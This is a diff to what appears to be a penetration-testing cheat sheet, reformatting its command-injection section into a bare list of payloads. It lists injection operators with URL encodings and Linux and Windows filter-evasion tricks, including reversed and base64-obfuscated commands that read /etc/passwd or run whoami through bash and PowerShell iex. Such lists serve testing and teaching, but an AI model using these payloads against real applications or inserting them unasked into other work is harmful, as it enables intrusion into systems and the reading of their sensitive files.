@@ -740,87 +740,144 @@ File Signatures	#List of File Signatures/Magic Bytes
 ##### Command Injection Attacks
 ```
 
-## Command Injection Operators
+# Injection operator - semicolon
+;
 
-| Injection Operator | Injection Character | URL-Encoded Character | Executed Command |
-|---|---|---|---|
-| Semicolon | `;` | `%3b` | Both |
-| New Line | `\n` | `%0a` | Both |
-| Background | `&` | `%26` | Both (second output generally shown first) |
-| Pipe | `|` | `%7c` | Both (only second output is shown) |
-| AND | `&&` | `%26%26` | Both (only if first succeeds) |
-| OR | `||` | `%7c%7c` | Second (only if first fails) |
-| Sub-Shell | `` ` ` `` | `%60%60` | Both (Linux-only) |
-| Sub-Shell | `$()` | `%24%28%29` | Both (Linux-only) |
+# Injection operator - new line
+\n
 
----
+# Injection operator - background
+&
 
-## Linux
+# Injection operator - pipe
+|
 
-### Filtered Character Bypass
+# Injection operator - AND
+&&
 
-| Code | Description |
-|---|---|
-| `printenv` | Can be used to view all environment variables |
-| **Spaces** |  |
-| `%09` | Using tabs instead of spaces |
-| `${IFS}` | Replaced with a space and a tab. Cannot be used in sub-shells (for example, `$()`) |
-| `{ls,-la}` | Commas are replaced with spaces |
-| **Other Characters** |  |
-| `${PATH:0:1}` | Replaced with `/` |
-| `${LS_COLORS:10:1}` | Replaced with `;` |
-| `$(tr '!-}' '"-~'<<<[)` | Shift character by one (`[` → `\`) |
+# Injection operator - OR
+||
 
-### Blacklisted Command Bypass
+# Injection operator - sub-shell (Linux)
+``
 
-| Code | Description |
-|---|---|
-| **Character Insertion** |  |
-| `'` or `"` | Total must be even |
-| `$@` or `\` | Linux-only |
-| **Case Manipulation** |  |
-| `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` | Execute command regardless of case |
-| `$(a="WhOaMi";printf %s "${a,,}")` | Another variation of the technique |
-| **Reversed Commands** |  |
-| `echo 'whoami' \| rev` | Reverse a string |
-| `$(rev<<<'imaohw')` | Execute reversed command |
-| **Encoded Commands** |  |
-| `echo -n 'cat /etc/passwd \| grep 33' \| base64` | Encode a string with Base64 |
-| `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)` | Execute Base64-encoded string |
+# Injection operator - sub-shell (Linux)
+$()
 
----
+# URL-encoded semicolon
+%3b
 
-## Windows
+# URL-encoded new line
+%0a
 
-### Filtered Character Bypass
+# URL-encoded background
+%26
 
-| Code | Description |
-|---|---|
-| `Get-ChildItem Env:` | Can be used to view all environment variables (PowerShell) |
-| **Spaces** |  |
-| `%09` | Using tabs instead of spaces |
-| `%PROGRAMFILES:~10,-5%` | Replaced with a space (CMD) |
-| `$env:PROGRAMFILES[10]` | Replaced with a space (PowerShell) |
-| **Other Characters** |  |
-| `%HOMEPATH:~0,-17%` | Replaced with `\` (CMD) |
-| `$env:HOMEPATH[0]` | Replaced with `\` (PowerShell) |
+# URL-encoded pipe
+%7c
 
-### Blacklisted Command Bypass
+# URL-encoded AND
+%26%26
 
-| Code | Description |
-|---|---|
-| **Character Insertion** |  |
-| `'` or `"` | Total must be even |
-| `^` | Windows-only (CMD) |
-| **Case Manipulation** |  |
-| `WhoAmi` | Simply send the command with mixed casing |
-| **Reversed Commands** |  |
-| `"whoami"[-1..-20] -join ''` | Reverse a string |
-| `iex "$('imaohw'[-1..-20] -join '')"` | Execute reversed command |
-| **Encoded Commands** |  |
-| `[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))` | Encode a string with Base64 |
-| `iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"` | Execute Base64-encoded string |
+# URL-encoded OR
+%7c%7c
 
+# URL-encoded sub-shell (Linux)
+%60%60
+
+# URL-encoded sub-shell (Linux)
+%24%28%29
+
+# Linux - view environment variables
+printenv
+
+# Linux - tab instead of space
+%09
+
+# Linux - space bypass with IFS
+${IFS}
+
+# Linux - comma replaced with space
+{ls,-la}
+
+# Linux - slash bypass
+${PATH:0:1}
+
+# Linux - semicolon bypass
+${LS_COLORS:10:1}
+
+# Linux - shift character by one
+$(tr '!-}' '"-~'<<<[)
+
+# Linux - character insertion
+' 
+"
+
+# Linux - character insertion with variable
+$@
+
+# Linux - character insertion with escape
+\
+
+# Linux - case manipulation
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+
+# Linux - lowercase variable trick
+$(a="WhOaMi";printf %s "${a,,}")
+
+# Linux - reverse string
+echo 'whoami' | rev
+
+# Linux - execute reversed command
+$(rev<<<'imaohw')
+
+# Linux - base64 encode command
+echo -n 'cat /etc/passwd | grep 33' | base64
+
+# Linux - execute base64 encoded command
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+
+# Windows PowerShell - view environment variables
+Get-ChildItem Env:
+
+# Windows - tab instead of space
+%09
+
+# Windows CMD - space bypass
+%PROGRAMFILES:~10,-5%
+
+# Windows PowerShell - space bypass
+$env:PROGRAMFILES[10]
+
+# Windows CMD - backslash bypass
+%HOMEPATH:~0,-17%
+
+# Windows PowerShell - backslash bypass
+$env:HOMEPATH[0]
+
+# Windows - character insertion
+'
+
+# Windows - character insertion
+"
+
+# Windows CMD - escape character insertion
+^
+
+# Windows - case manipulation
+WhoAmi
+
+# Windows PowerShell - reverse string
+"whoami"[-1..-20] -join ''
+
+# Windows PowerShell - execute reversed command
+iex "$('imaohw'[-1..-20] -join '')"
+
+# Windows PowerShell - base64 encode command
+[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))
+
+# Windows PowerShell - execute base64 encoded command
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
 
 ```
 ##### Web Attacks
